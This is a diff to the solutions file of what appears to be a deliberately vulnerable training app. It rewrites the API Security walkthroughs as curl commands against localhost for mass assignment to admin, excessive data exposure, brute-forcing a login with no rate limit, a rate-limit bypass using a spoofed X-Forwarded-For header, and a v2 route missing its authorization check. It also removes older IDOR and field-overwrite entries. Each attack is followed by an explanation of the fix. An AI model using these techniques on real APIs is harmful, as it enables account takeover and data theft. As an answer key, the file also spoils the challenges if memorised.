@@ -1447,159 +1447,125 @@ Why it works: disabling two-factor authentication is a security-sensitive state 
 
 ## api – API Security
 
-**1. Mass assignment** – `PENTRIX{...}`
-Log in (`GET /api/login/alice`), then PATCH your profile with an extra field the API blindly copies:
-```
-PATCH /api/me
-{"role":"admin"}
-```
-Why it works: the update handler merges the whole JSON body into the user object instead of picking allowed fields.
+**1. Mass Assignment** – `PENTRIX{...}`
 
-**2. Excessive data exposure** – `PENTRIX{...}`
-```
-GET /api/users
-```
-The response includes password hashes, and the flag rides in the `X-Pentrix-Flag` header. APIs must return only what the client needs.
+1. Log in as alice and check your current profile:
+   ```bash
+   curl -s -c jar -b jar http://localhost:3000/api/login/alice
+   curl -s -b jar http://localhost:3000/api/me   # role: "user"
+   ```
+2. PATCH your profile with an extra field the form never showed you:
+   ```bash
+   curl -s -b jar -X PATCH http://localhost:3000/api/me \
+     -H 'Content-Type: application/json' \
+     -d '{"display_name":"alice","role":"admin"}'
+   ```
+3. The response shows your role flipped to `"admin"` and the flag is awarded.
 
-**3. Missing rate limiting** – `PENTRIX{...}`
- Hammer the login endpoint: 14 failed attempts, then a correct one on attempt 15 (`alice` / `alice123`). No throttling exists, so credential stuffing is trivially scriptable.
+Why it works: the handler builds its SQL SET clause from every key in the JSON
+body with no allowlist, so client-supplied keys (even `role` or `id`) become
+columns in the UPDATE. Real APIs must pick allowed fields explicitly, never
+merge the raw request body into a database update.
 
----
+**2. Excessive Data Exposure** – `PENTRIX{...}`
 
-**4. BOLA: Order Access** – `PENTRIX{...}`
+1. Fetch the user list and dump the raw response, headers included:
+   ```bash
+   curl -i http://localhost:3000/api/users
+   ```
+2. The JSON body is whole database rows: `password`, `secret`, and everything
+   else the `SELECT *` returned. The `X-Pentrix-Flag` response header carries
+   the flag.
+3. Browser option: open `/api/users/view` and the flag box is rendered above
+   the raw JSON.
 
-`GET /api/v1/orders/:id` trusts the id and never checks ownership:
+Why it works: the endpoint serializes full database rows to JSON, so fields
+the client should never see (passwords, secrets, internal ids) leave the
+server. APIs must return only the fields each consumer needs, using explicit
+projections instead of `SELECT *`.
 
-```bash
-curl -b c.txt http://localhost:3000/api/v1/orders/1   # your own order
-curl -b c.txt http://localhost:3000/api/v1/orders/2   # bob's order, address included
-```
+**3. Missing Rate Limiting** – `PENTRIX{...}`
 
-Reading order 2 as alice returns another user's order (with their address) and
-awards the flag.
+1. Hammer the login endpoint with wrong passwords for alice. The counter per
+   username is never enforced, so nothing stops you:
+   ```bash
+   for i in $(seq 1 14); do
+     curl -s -X POST http://localhost:3000/api/login \
+       -H 'Content-Type: application/json' \
+       -d '{"username":"alice","password":"wrong"}' > /dev/null
+   done
+   ```
+2. Log in correctly on attempt 15:
+   ```bash
+   curl -s -X POST http://localhost:3000/api/login \
+     -H 'Content-Type: application/json' \
+     -d '{"username":"alice","password":"alice123"}'
+   ```
+3. The successful response carries the flag, because the success followed 15
+   or more attempts for alice.
 
-Why it works: broken object-level authorization; the endpoint resolves the
-object id without verifying it belongs to the caller.
+Why it works: the endpoint counts attempts per username but never blocks,
+locks out, or slows down the caller, so unlimited guesses can be scripted.
+Real logins need throttling, lockout, or CAPTCHA after a few failures.
 
-**5. Mass Assignment: Role** – `PENTRIX{...}`
+**4. Rate Limit Bypass via X-Forwarded-For** – `PENTRIX{...}`
 
-`PATCH /api/v1/users/:id` builds its SQL SET clause from every key in the JSON
-body, with no allowlist:
+1. Burn your quota: `POST /api/v1/login` locks an "IP" out after 3 bad
+   attempts.
+   ```bash
+   for i in 1 2 3 4; do
+     curl -s -X POST http://localhost:3000/api/v1/login \
+       -H 'Content-Type: application/json' \
+       -d '{"username":"alice","password":"wrong"}'
+   done
+   # 4th attempt: 429 Too many attempts
+   ```
+2. Confirm the lockout bites real logins too: the correct password from your
+   real IP also gets 429.
+   ```bash
+   curl -s -X POST http://localhost:3000/api/v1/login \
+     -H 'Content-Type: application/json' \
+     -d '{"username":"alice","password":"alice123"}'   # still 429
+   ```
+3. Change your "IP" and walk in. The rate-limit identity comes from the
+   `X-Forwarded-For` header, which you control:
+   ```bash
+   curl -s -X POST http://localhost:3000/api/v1/login \
+     -H 'Content-Type: application/json' \
+     -H 'X-Forwarded-For: 10.9.9.9' \
+     -d '{"username":"alice","password":"alice123"}'
+   ```
+   The login succeeds (`"ok":true`) even though your real IP is locked out,
+   and the flag is awarded.
 
-```bash
-curl -b c.txt -X PATCH http://localhost:3000/api/v1/users/2 \
-  -H 'Content-Type: application/json' \
-  -d '{"role":"admin"}'
-```
+Why it works: the server keys the rate limit by client IP but reads that IP
+from a client-controlled header, so the attacker gets a fresh quota by
+spoofing a new IP per attempt. Trust only the connection's remote address, or
+validate that the header comes from a trusted proxy.
 
-The response shows your role flipped to admin and the flag is awarded.
+**5. API Version AuthZ Bypass** – `PENTRIX{...}`
 
-Why it works: client-controlled keys become columns in the UPDATE, so `role`
-is writable even though no UI ever sends it.
+1. Log in as alice:
+   ```bash
+   curl -s -c jar -b jar http://localhost:3000/api/login/alice
+   ```
+2. Confirm v1 protects the record: `GET /api/v1/users/3` answers 403 ("you
+   can only view your own record").
+   ```bash
+   curl -s -b jar http://localhost:3000/api/v1/users/3
+   ```
+3. Request the same record through the copied v2 route:
+   ```bash
+   curl -s -b jar http://localhost:3000/api/v2/users/3
+   ```
+   v2 returns the full user record (username, email, role, secret) and awards
+   the flag.
 
-**6. API Key Exposure** – `PENTRIX{...}`
+Why it works: v2 was copy-pasted from v1 but the authorization check never
+made it over, so any logged-in user can read anyone's record through the new
+version. Every new version or copy of an endpoint must carry the original
+access checks; review versioned routes for exactly this drift.
 
-`GET /api/v1/me` bundles a secret API key into the profile response:
-
-```bash
-curl -b c.txt http://localhost:3000/api/v1/me
-```
-
-The JSON contains `api_secret` (e.g. `ak_live_alice_9f2c41`), a credential the
-client should never see. Fetching it awards the flag.
-
-Why it works: excessive data exposure; the server serializes internal secrets
-into a client-facing response.
-
-**7. Rate Limit Bypass via X-Forwarded-For** – `PENTRIX{...}`
-
-`POST /api/v1/login` locks an IP out after 3 bad attempts, but the "client IP"
-is read from the `X-Forwarded-For` header, which you control:
-
-```bash
-# burn the 3 attempts for your real IP
-for i in 1 2 3 4; do
-  curl -s -X POST http://localhost:3000/api/v1/login \
-    -H 'Content-Type: application/json' \
-    -d '{"username":"alice","password":"wrong"}'
-done
-# 4th attempt: 429 Too many attempts. The real password is locked out too:
-curl -s -X POST http://localhost:3000/api/v1/login \
-  -H 'Content-Type: application/json' \
-  -d '{"username":"alice","password":"alice123"}'   # still 429
-# change your "IP" and walk in
-curl -s -X POST http://localhost:3000/api/v1/login \
-  -H 'Content-Type: application/json' -H 'X-Forwarded-For: 10.9.9.9' \
-  -d '{"username":"alice","password":"alice123"}'   # ok:true + flag
-```
-
-The flag is awarded when the real IP is locked out yet the login succeeds under
-a spoofed header.
-
-Why it works: rate-limit identity comes from a client-controlled header, so the
-attacker gets a fresh quota by spoofing a new IP per attempt.
-
-**8. Unsafe PUT: Read-only Field Overwrite** – `PENTRIX{...}`
-
-`PUT /api/v1/profile` replaces your profile object and copies every key you
-send, including the read-only `is_admin` flag:
-
-```bash
-curl -b c.txt -X PUT http://localhost:3000/api/v1/profile \
-  -H 'Content-Type: application/json' \
-  -d '{"display_name":"alice","is_admin":1}'
-```
-
-The response shows `is_admin: 1` and the flag is awarded.
-
-Why it works: PUT full-object replacement with no field allowlist lets the
-client overwrite server-managed fields.
-
-**9. API Version AuthZ Bypass** – `PENTRIX{...}`
-
-`GET /api/v1/users/:id` enforces "your own record, or admin". The v2 copy
-forgot the check:
-
-```bash
-curl -b c.txt http://localhost:3000/api/v1/users/3   # 403 Forbidden
-curl -b c.txt http://localhost:3000/api/v2/users/3   # bob's full record + flag
-```
-
-The v2 response includes bob's password hash and secret.
-
-Why it works: the authorization check was not carried over when the endpoint
-was versioned, so the new route exposes what the old one protects.
-
-**10. IDOR: Invoice Enumeration** – `PENTRIX{...}`
-
-Invoice ids are sequential and `GET /api/v1/invoices/:id` does not check
-ownership:
-
-```bash
-curl -b c.txt http://localhost:3000/api/v1/invoices/1   # yours
-curl -b c.txt http://localhost:3000/api/v1/invoices/2   # someone else's + flag
-```
-
-Why it works: predictable identifiers plus missing ownership check turn id
-guessing into cross-user data access.
-
-**11. PATCH Self-Privilege Escalation** – `PENTRIX{...}`
-
-`PATCH /api/v1/me` is meant for `display_name` and `bio`, but there is no
-allowlist:
-
-```bash
-curl -b c.txt -X PATCH http://localhost:3000/api/v1/me \
-  -H 'Content-Type: application/json' \
-  -d '{"is_admin":1}'
-```
-
-The response shows `is_admin: 1` and the flag is awarded. A benign
-`{"bio":"hello"}` patch earns nothing, proving the flag is tied to the
-privilege field.
-
-Why it works: partial-update endpoints that merge arbitrary keys into the
-record let the client promote itself.
 ---
 
 ## misconfig – Security Misconfiguration
